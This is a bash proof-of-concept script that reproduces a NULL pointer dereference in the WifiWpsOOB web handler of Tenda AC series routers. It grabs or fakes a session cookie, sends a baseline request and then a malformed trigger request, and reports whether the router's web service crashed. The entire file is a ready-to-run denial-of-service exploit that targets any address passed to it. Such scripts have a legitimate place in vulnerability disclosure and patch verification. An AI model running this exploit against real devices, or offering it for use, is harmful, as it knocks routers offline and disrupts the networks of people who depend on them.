#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# Tenda AC series - formWifiWpsOOB NULL pointer dereference (CWE-476)
# One-command reproduction.
#
#   usage: ./poc.sh [target-ip]        (default 192.168.0.1)
#
# The script performs a baseline request (index present, expected 200) and then
# the trigger request (index absent, expected crash), and reports whether the
# web service survived.
# ---------------------------------------------------------------------------
set -u

T="${1:-192.168.0.1}"
U="http://${T}/goform/WifiWpsOOB"

code() { curl -s -o /dev/null -w '%{http_code}' --max-time "${2:-10}" "${@:3}" 2>/dev/null || echo "000"; }

echo "[*] target : $U"
echo

echo "[1/4] obtaining a server-issued cookie (some builds answer 302 first)"
CK=$(curl -si --max-time 10 "$U" 2>/dev/null \
     | grep -i '^set-cookie:' | head -1 \
     | cut -d' ' -f2 | cut -d';' -f1)
[ -z "$CK" ] && CK="password=x"
echo "      cookie = $CK"
echo

echo "[2/4] baseline - 'index' present (expect 200 and a live service)"
C1=$(code 20 -X POST "$U" \
        -H "Cookie: $CK" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        -d 'index=bbbbbbbbbbbbbbbb&sta_pin=t&wifi_chkHz=t')
echo "      HTTP = $C1"
echo

echo "[3/4] trigger - 'index' absent"
C2=$(code 20 "$U" -H "Cookie: $CK")
echo "      HTTP = $C2   (000 = connection closed, no response)"
echo

echo "[4/4] confirming the service is gone"
C3=$(code 8 "$U" -H "Cookie: $CK")
echo "      HTTP = $C3"
echo

if [ "$C1" = "200" ] && [ "$C2" = "000" ] && [ "$C3" = "000" ]; then
  echo "[+] VULNERABLE: baseline served, trigger killed the web service."
elif [ "$C2" = "000" ]; then
  echo "[?] service stopped responding, but the baseline was not 200 (auth/setup may differ)."
else
  echo "[-] not reproduced with these parameters."
fi
